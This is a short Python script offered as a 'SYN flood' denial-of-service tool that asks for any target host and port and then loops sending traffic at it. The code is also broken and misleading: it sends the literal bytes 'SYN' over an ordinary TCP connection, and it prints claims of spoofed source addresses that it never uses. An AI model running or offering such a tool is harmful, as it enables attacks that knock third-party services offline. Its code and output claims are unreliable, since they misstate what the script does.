import socket
import random

def syn_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # To avoid connection reuse issues

    try:
        sock.connect((target_ip, target_port))
        print(f"Connected to {target_ip} on port {target_port}")

        while True:
            fake_ip = '.'.join([str(random.randint(0, 255)) for _ in range(4)])
            sock.send(b'SYN')
            print(f"Flooding {target_ip} on port {target_port} with SYN requests from IP: {fake_ip}")
    except socket.error as e:
        print(f"Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    target_hostname = input("Enter the target hostname or IP: ").strip()
    
    # Remove protocol if provided
    if target_hostname.startswith("http://") or target_hostname.startswith("https://"):
        target_hostname = target_hostname.split("//")[1]
    if "/" in target_hostname:  # Remove any trailing path
        target_hostname = target_hostname.split("/")[0]

    target_port = int(input("Enter the target port: "))

    try:
        target_ip = socket.gethostbyname(target_hostname)
        print(f"Target IP resolved: {target_ip}")
    except socket.gaierror:
        print("Error: Unable to resolve hostname. Please check the input.")
        exit()

    syn_flood(target_ip, target_port)
